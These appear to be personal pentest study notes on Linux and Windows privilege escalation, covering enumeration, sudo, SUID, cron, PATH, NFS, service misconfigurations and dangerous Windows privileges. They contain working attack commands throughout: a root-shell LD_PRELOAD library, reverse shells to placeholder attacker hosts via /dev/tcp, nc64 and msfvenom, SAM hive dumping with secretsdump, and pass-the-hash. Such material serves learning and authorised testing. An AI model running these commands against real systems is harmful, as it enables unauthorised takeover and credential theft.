# Linux
## Enumeration
### hostname
The `hostname` command will return the hostname of the target machine, although most times meaningless, it can sometimes provide information about the target system's role within the corporate network
### uname -a
`uname -a` will print system information giving us additional details about the kernel used by the system, to be then paired with the search of an exploit that could lead to escalation
### /proc/version
The proc filesystem (procfs) provides information about the target system processes. Using `cat /proc/version` may gives us information on the kernel version and additional data such as whether a compiler is installed.
### /etc/issue
Systems can also be identified by looking at the `cat /etc/issue` file. This file usually contains some information about the operating system but can easily be customised or changed.
### ps
The `ps` command is an effective way to see the running processes on a linux system. It shows:
* PID: process ID
* TTY: Terminal type used by the user
* TIME: Amount of CPU time used by the process (not the time the process has been running for)
* CMD: The command or exe running 
It also provides some options

| option | description |
| ---- | ---- |
| `A` | displays information about all available processes |
| `a` | info about processes associated with terminals |
| `e` | info about processes for current user |
| `x` | shows processes that are not attached to a terminal |
| `f` | sick formatting |
| `j` | more sick formatting |
| `u` | shows user name |

Some sick wombo combos

* `ps axfj` to view process tree
* `ps aux` to check all processes as well as users
	* `ps aux | cut -d ' ' -f1 | sort | uniq` To list only the users

### env
The `env` command will show environmental variables, this can show us the home folder of our user, the shell being used and the PATH variable may have a compiler or a scripting language that could be used to run code on the target system or be leveraged for privilege escalation.

### sudo -l
The target system may be configured to allow users to run some commands with root privileges. We can use `sudo -l` command to list all commands that we can run using sudo

### ls
Although certain to be used, make sure to use `ls -la` to display hidden files

### Id
The `id` command will provide a general overview of the user's privilege level and group memberships. Can also be used to obtain the information of another user

### /etc/passwd
reading the `/etc/passwd` file can be an easy way to discover users on the system. We can grep it and then cut the output to make a bruteforceable list with `/etc/passwd | grep home | cut -d ':' -f1`. This takes advantage of the fact that most real users would likely have their own folder under the home directory.

### history
The `history` command can gives us some idea about the target system and maybe even passwords or usernames

### ifconfig
The target system may be a pivoting point to another network. The `ifconfig` command will gives us information about the network interfaces of the system.

### netstat
The `netstat` command can be used with several options to gather information on existing connections

|option|description|
|-|-|
|`-a` |shows all listening ports and established connections.  |
|`-l` |list ports in listening mode. |
|`-s` |list network usage statistics |
|`-t` |shows TCP protocols (can be used with other options)  |
|`-u` |shows UDP protocols (can be used with other options) |
|`-p` |shows PID information (doesn't display it if the process is owned by another user unless sudo) |
|`-i` |shows interface statistics (checking RX-OK we can see which ones may be more active) |
Some wombo combos
- `netstat -noa`, does not resolve names, displays timers, displays all sockets

### Find
Searching is THE thing, as it can lead to potential privilege the `find` command is now our best friend. 
hax list:
- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size 
	- we can add `+` or `-` to specify more than or less than like `-size +100M` 
- `... -type d 2>/dev/null`: redirect errors to /dev/null and have a cleaner output

Folders and files that can be written to or executed from:
- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

Find development tools and supported languages:
- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

Find specific file permissions:
- `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

## Automated Enumeration Tools
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Kernel Exploits
The kernel on linux systems manages the communication between components such as the memory on the system and applications. This function requieres the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
The process is as simple as:
- Identify the kernel version (`uname -r`)
- Search and find an exploit code for the kernel version
- Run it
- Profit

Although simple it varies from version to version and **_A failed kernel exploit can lead to a system crash_**. So please read things through before doing anything stupid.

## Sudo
The sudo command, by default, allows us to run a program with root privileges. Under some conditions, system admins may need to give users some flexibility on their privileges. Any user can check its current situation related to root privileges using the `sudo -l` command.
[GTFObins](https://gtfobins.github.io/) is a valuable source that provides information on how any program on which we may have sudo rights can be potentially used to escalate.

### Leverage application functions
In some applications we would be able to use certain functions of those applications to not only be able to escalate but also read, write or execute certain programs which normally we wouldn't have access. 
One example is the **Apache2 server**. We can leverage an option of the application (`-f file`) that supports loading alternative config files. When loading a file such as `/etc/shadow` it will result in an error message that includes the first line of the file.

### Leverage LD_PRELOAD
On some systems, we may see the `LD_PRELOAD` environment option when doing `sudo -l`. This is a function that allows any program to use shared libraries. If the `env_keep `option is enabled we can generate a shared library which will be loaded and executed before the program is run. Note that the `LD_PRELOAD` option will be ignored if the real user ID is different from the effective user ID. For a sick blog post with explanation and stuff pls refer to [sick blog post.](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) 
A quick step guide to do this goes as follows:
- Check for LD_PRELOAD (with the env_keep option)
- Write a simple C code compiled as a share object (.so) file
- Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

An example of a simple C code to gain root can be:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
We can then save this code with a .c extension and compile it using `gcc` into a shared object file using the following
```sh
gcc -fPIC -shared shell.c -nostartfiles -o shell.so
```
Finally we can use this shared object when launching any program our user can run with sudo, we just need to run the program by specifying the LD_PRELOAD option as follows:
```sh
sudo LD_PRELOAD=/path/to/file/shell.so COMMAND
```
This will result in a shell spawn with root privileges

## SUID
Much of linux privilege controls rely on controlling the users and files interactions. These privilege levels change with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.
These files have an "s" bit set showing their special permission level, we can find them with
```sh
find / -type f -perm -04000 -ls 2>/dev/null
```
will list files that have SUID or SGID bits set. 
A good practice would be to compare executables on this list with [GTFObins](https://gtfobins.github.io/) and filtering by SUID so it only shows binaries known to be exploitable when the SUID bit is set.

From here the procedure depends on which commands are available for us to use. One way for example could be to [[Unshadow]] and use [[John The Ripper]] to try and get the plain text passwords. Or To add a new user with hopefully root privileges by using [[Openssl]] to create the hash of a new password and then add it into the `/etc/passwd` file.

## Capabilities
Another method system administrators can use to increase the privilege level of a process or binary is through Capabilities. These can help manage privileges at a more granular level, if an administrator doesn't want to give a user higher privileges, they can change the capabilities of a binary to allow it to get trough its task without needing a higher privilege user. 
We can see which binaries have enabled capabilities by using
```sh
getcap -r / 2>/dev/null
```
Which would result in all the binaries with have capabilities, we are specially interested in the ones with `cap_setuid` as these can often result in escalation. For methodology refer to [GOATbins](https://gtfobins.github.io/). Even though these programs have the SUID capability, they may not have the SUID bit enabled, so they will not appear when enumerating for SUID.

## Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions. The idea being, if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Each user on the system has their crontab file and can run specific tasks whether they are logged in or not. Any user can read the file keeping system-wide cron jobs under `/etc/crontab`. 
Here we can find every cron job configured by a user. We can then go and check those scripts to see if the can be modified in any way to instead run code that will allow us to escalate. The scripts will have to use the tools available on the target system. Some things to note:
- The command syntax will vary depending on the available tools (maybe we won't be able to use `nc` as it may not support the `-e` option)
- We should always prefer to start reverse shells, as we do not want to compromise the system integrity during a real pentest.

An example of a reverse shell for a .sh file would be something like
```sh
#!/bin/bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```
NOTE: remember to check if the file can be executed. If not we can use
```sh
chmod +x FILE
```
to make it so it can be ran.

Another case, although similar, is if a old cron job is still set up, in this case the original file could have been removed, if so we can create a new file in the original path so that the new file is executed with the reverse shell

## PATH
If a folder for which a user has write permissions is located in the PATH, we could potentially hijack an application to run a script. PATH in linux is an environmental variable that tells the operating systems where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, linux will start searching in folders defined under PATH.
We can check it with either:
```sh
env
```
or for a more direct result
```sh
echo $PATH
```
Whenever we are looking for a way to escalate using this technique there are some things that we need to keep in mind, as it always depends entirely on the existing configuration of the target system:
- What folders are located under $PATH?
- Does our user have write privileges for any of these folders?
- Can we modify $PATH?
- Is there a script/app that we can start that will be affected by this vulnerability?

To check permissions of all the PATH directories all at once
```sh
echo $PATH | tr ':' '\n' | while read i; do ls -ld $i; done
```
We could also check for writable folders overall with
```sh
find / -writable 2>/dev/null | cut -d '/' -f 2,3 | grep -v proc | sort -u
```

Now if non of them match, and we do not have write permissions to one of the already existing directories in PATH, then we can hopefully add a directory to which we have permissions to PATH, doing so like:
```sh
export PATH=/tmp:$PATH
```
Normally `/tmp` would be easiest as we more often than not will have permissions. We do this by using the `export` command which can set environment variables like `PATH`. So we just append the new directory to the already existing one.
At this point we can try to use and already existing script/application. In this case suppose that we found one that tries to launch a system binary for example (escalation.c):
```C
#include<unistd.h>
void main(){
setuid(0);
setgid(0);
system("/bin/bash");
}
```
This script will set itself as root and then try to run a binary called `hack`. As the path is not provided it will also look for it inside the folders listed under path. If we wanted to procede with this C example then we would have to compile it into and executable and set the SUID bit
```sh
gcc escalation.c -o escalate -w
chmod u+s escalate
```
Now we can create a file named `hack` that will have whichever command we want for it to run as root, and execute it through our `escalate` script.
```sh
echo "cat /etc/shadow" > hack
./escalate
```
Here we create it so it can show `/etc/shadow`, but we could also give it a payload to get a shell like `/bin/bash` or something else.

## NFS
Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help us gain root access on the target system. Finding a root ssh private key on the target system and connecting via SSH is a way to obtain root instead of trying to increase our current user's privilege level.

Another vector could be a misconfigured network shell. NFS (Network File Sharing) configuration is kept in the `/etc/exports` file, this file is created during the NFS server installation and can usually be read by users.
The critical element for this privilege escalation is the `no_root_sqash` option. By default, NFS will change the root user to `nfdnobody` and strip any file from operating with root privileges. But if the `no_root_squash` option is present on a writable share, we can create an executable with the SUID bit set and run it on the target system.

We can now start by enumerating mountable shares from our attacking machine like so
```sh
showmount -e TargetIP
```
We will then mount one of the `no_root_squash` shares to our attacking machine and start building an executable (ej with a share `/tmp`)
```sh
mkdir /hacker/folder
```
```sh
mount -o rw TargetIP:/tmp /hacker/folder
```
Essentially we are creating a new directory on our attacking machine to then link that directory with the `/tmp` one inside the target machine with read-write permissions, so if we create an executable on our machine it will appear on the target as well. From here we can try a C code to open a shell. (nfs.c)
```c
void main(){
setuid(0);
setgid(0);
system("/bin/bash");
}
```
To then compile it and set the SUID bit
```sh
gcc nfs.c -o nfs -w
chmod +s nfs
```
And finally run it in the target machine to gain a shell with root.

# Windows
To start, escalation works in the with the same idea in mind. Windows systems mainly have two kinds of users.

| Users | Privileges |
| ---- | ---- |
| Administrators | These users have the most privileges. They can change any system configuration parameter and access any file in the system |
| Standard Users | These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. |

In addition to that, there are some special built-in accounts used by the operating system in the context of privilege escalation:

| Users | Privileges |
| ---- | ---- |
| SYSTEM / LocalSystem | An account used by the operation system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| Local Service | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network. |
| Network Service | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network. |
These accounts are created and managed by windows, and we won't be able to use them as other regular accounts.

## Reaping Passwords
The easiest way to gain access to another user is to gather the credentials from a compromised machine (duh). For some careless people, leaving the credentials in the open is not a far fetched scenario, checking for plain text files, audio, images or even stored by some software like browsers or email clients.
### Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't requiere users interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
As part of these files, we may encounter credentials such as:
```
<Credentials>
    <Username>Administrator</Username>
    <Domain>you.tube</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell history
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Note that this command will only work from cmd as Powershell wont't recognize `%userprofile%` as an environment variable. To read the fiel from Powershell, we'd have to replace it with `$Env:userprofile`

### Saved Windows Credentials
Windows allows us to use other user's credentials, this function also gives the option to save these credentials on the system. the command below will list saved credentials:
```
cmdkey /list
```
While we can't see the actual passwords, if we notice any credentials worth trying, we can use them with the `runas` command and the `/savecred` option:
```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed versions of IIS, we can find web.config in one of the following locations:
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Here is a quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
To retrieve the stored proxy credentials, we can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Just as PuTTY stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

## Quick Ws
Misconfigurations are our best friends as always, in this case the following may be more CTF related but may also prove useful in real pentests. 
### Scheduled Tasks
Looking into scheduled tasks on the target system, we may encounter one that either lost its binary or is using one that we can modify to our advantage.
These can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services we can use a command like the following:
```
schtasks /query /tn vulntask /fo list /v
```
With this we can get a lot of information about the task, but what matters most to us is the "Task to Run" parameter which indicates the obvious, as well as the "Run As User" parameter, which again, indicates what it says. If we can modify the task to run exec, we can then change it for a payload that may result in escalation. 

To check file permissions on the executable, we use `icacls`. With this we can look for the `(F)` parameter which indicates full access as long as our user belongs to the corresponding group. `(M)` indicates modify. `(R)` Read. `(X)` Execute.

If yes, then we can proceed with our payload, this could be either executing an application to which the "run as user" has access to, or more directly creating a reverse shell (which needs the user to be able to run it, so worth checking that out first). As usual we can refer to [S(kull)hells](https://www.revshells.com) for quick reverse/bind shells. but using for example nc64 (netcat for windows) a quick payload could be:
```
c:\path\nc64.exe AtacckerIP PORT -e cmd.exe
```
Finally we need to wait for the next time the scheduled task runs, then we should receive the reverse shell. Normally (if well configured) we a random user shouldn't be able to trigger the task whenever, but if for some reason our user has that luck we could ran it manually with:
```
schtasks /run /tn vulntask
```

### Always Install Elevated
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account. We could take advantage of this to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set.  We can query these from the command line using the commands below
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
To be able to exploit this vulnerability, both should be set. If they are, we can generate a malicious .msi file using [[Metasploit#Msfvenom|Msfvenom]], as seen below:
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
As this is a reverse shell we should preferably run the [[Metasploit]] handlser module configured accordingly. Once we have transferred the file we have created, we can run the installer with the command below and receive the reverse shell:
```
msiexec /quit /qn /i C:\Windows\Temp\malicious.msi
```

## Abusing Service Misconfigurations
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is importante to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
To better understand the structure of a service we can use `sc qc SERVICE` to check it.
Here we can see that the associated executable is specified through the `BINARY_PATH_NAME` and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permissions to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from [[Process Hacker]]. 
All of the services configurations are stored on the registry under 
```
HKLM\SYSTEM\CurrentControlSet\Services\
```
We can check it with the **Registry Editor** app. A subkey exists for every service in the system. Here we can again see, values for things like the executable path as well as the account that the program will be ran as. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. And yes, only administrators can modify such registry entries by default.
### Insecure Permission on Service Executable
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account with relative ease.
To do this we can first query a service configuration using `sc`
```
sc qc SERVICE
```
Then using the path found on the **BINARY_PATH_NAME** check it for permissions using `icacls`
```
icacls c:\path\path\service.exe
```
Which will result in a list of permissions for different groups. What is mainly of our concern is both the `(F)` and `(M)` permissions to indicate that it is overwritable. We can then try to use [[Metasploit#Msfvenom|Msfvenom]] to craft a payload to gain a reverse shell like so
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_PORT LPORT=PORT -f exe-service -o rev-svc.exe
```
and then download the payload using something like a python server and `wget`

Once we have the payload in the windows server, we proceed to replace the service executable with our payload and change the permission so other users can execute the payload. Also, good practice to not remove the original payload if we mess up, we can instead do something like `move service.exe service.exe.bkp`. And then to change permissions 
```
icacls service.exe /grant Everyone:F
```
Finally we just need to start a listener service on our part. And restart the service so the executable can do it's job
```
sc stop SERVICE
sc start SERVICE
```
(if done in PowerShell, we need to use `sc.exe` as PowerShell uses `sc` as an alias to `Set-Content`)

### Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a change to force a service into running arbitrary executables by using a rather obscure feature.
When working with Windows services a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. This occurs when the path of the associated executable isn't properly quoted to account for spaces on the command.
```bash
#good
BINARY_PATH_NAME    : "C:\MyPrograms\Real Folder Quoted\Service.exe"

#bad
BINARY_PATH_NAME    : C:\MyPrograms\Real Folder Unquoted\Service.exe
```
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the binary path folder,  the command becomes ambiguous, and the SCM doesn't know which of the following we are trying to execute.

| Command | Argument 1 | Argument 2 |
| ---- | ---- | ---- |
| `C:\MyPrograms\Real.exe` | `Folder` | `Unquoted\Service.exe` |
| `C:\MyPrograms\Real Folder.exe` | `Unquoted\Service.exe` |  |
| `C:\MyPrograms\Real Folder Unquoted\Service.exe` |  |  |
This has to do with how the command prompt parses a command. Usually, when we send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Real.exe` and take the rest as arguments. Instead of failing it tries to search for each of the binaries in the order shown in the table until one works (normally the latter).
From this the problem is clear, if we create a binary which matches one of the "incomplete tries" we can force the service to run our code.
Although trivial many default folders already include spaces like `C:\Program Files` and `C:\Program Files (x86)`, so reading through services expecting one to be missing quotes and have spaces is not that farfetched. Taking this into account, theses two folders aren't writeable by default, but some installers may change the permissions on the installed folders making the services vulnerable.

From here the usual, craft payload (msfvenom or other), transfer it (python server), change permissions (`icacls payload.exe /grant Everyone:F)`), and restart service (`sc stop SERVICE; sc start SERVICE`).

### Insecure Service Permissions
Even if both the executable DACL is well configured, and the service's path is correctly quoted. Should the service DACL (not the service's executable DACL) allow us to modify the configuration of a service, we will be able to reconfigure the service. Allowing us to point to any executable we need and run it with any account we prefer, including SYSTEM itself.
To check for a service DACL from the command line, we can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. Using it will look like
```powershell
accesschk64.exe -qlc Service
```
Here we usually care for the `BUILTIN\Users` group, or any other to which our user is a part of, and of course the access `SERVICE_ALL_ACCESS` which means that we can reconfigure the service

## Dangerous Privileges
Each account has privileges that allow it to perform specific system-related tasks. These tasks can be as  simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
Each user has a set of assigned privileges that can be checked with the following command in the command prompt when ran as administrator:
```
whoami /priv
```
A complete list of available privileges on Windows system can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)  From an attacker's view, only those privileges that allow us to escalate in the system are of interest. For a comprehensive list of exploitable privileges refer to the [Priv2Admin](https://github.com/gtworek/Priv2Admin) github project.
Here we shall go over some of the most common privileges.

### SeBackup / SeRestore
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea being that this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. 
With this we can trivialize escalation on the system by using a variety of techniques. One of which consists on copying the SAM and SYSTEM registry hives to extract the local Administrator's passwords hash.
To do this we can use the following commands:
```
reg save hklm\system C:\Path\Tosave\system.hive
reg save hklm\sam C:\Path\Tosave\sam.hive
```
Which will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using [[SMB]] or any other available method. For SMB, we can use [[impacket]]'s `smbserver.py` to start a simple SMB server with a network share in the current directory of our attacking machine.
```sh
mkdir share

python3.9 /opt/impacket/examples/smbserver.py -smb2support -username USER -password PASS public share
```
This will create a share named `public` to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command on the windows machine to transfer both files to our AttackBox
```
copy C:\Path\Tosave\sam.hive \\AtacckerIP\public\
copy C:\Path\Tosave\system.hive \\AtacckerIP\public\
```
And then use [[impacket]] to retrieve the user's password hashes
```sh
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
And finally we can use the Administrator or other user's hash to perform a Pass-the-Hash attack with [[impacket]] and gain access to the target machine.
```sh
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 USER@IP
```

### SeTakeOwnership
The SeTakeOwnership allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as System and take ownership of the service's executable. Another route is the one we are gonna cover however.

We will abuse `utilman.exe` to escalate privileges this time. It is a built-in windows application used to provide Ease of Access options during the lock screen. Since utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file replacing it is trivial.
To accomplish this, we will start by taking ownership with the following command
```
takeown /f C:\Windows\System32\Utilman.exe
```
Now we can grant us all the privileges over it
```
icacls C:\Windows\System32\Utilman.exe /grant USER:F
```
After this we can replace utilman.exe with a copy of cmd.exe
```
copy cmd.exe utilman.exe
```
To now trigger it, we can lock our screen from the start button, and when prompted with the login page, we can proceed to click on the "Ease of Access" button in the down-right corner.
Note that when opening the cmd we may only be able to run built-in commands, but we can then try to use certain applications to gain some more footholding, read or even edit files. One example is running notepad.exe to read and edit .txt files.

### SeImpersonate / SeAssignPrimaryToken
These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, we will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. **Internet Information Services** (IIS) will also create a similar default account called "iis apppool\\defaultapppool" for web applications.

To elevate privileges using such accounts, we need the following: 
1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.
We can use [[RogueWinRM]] to accomplish both conditions. Assuming we already have compromised a website running on IIS and that a we have planted a webshell on that address. 
We can use the webshell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest.
To use [[RogueWinRM]], we first need to upload the exploit to the target machine. 

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell. And then we can trigger the exploit using the following in the webshell
```
c:\RogueFolder\RogueWinRM.exe -p "C:\CatFolder\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```
This will essentially execute the RogueWinRM.exe, starting a fake WinRM and impersonate the SYSTEM user, then executing nc64.exe (`-p`) and passing the arguments that it needs to spawn a shell and connect (`-a`)


## Vulnerable Software

## ToT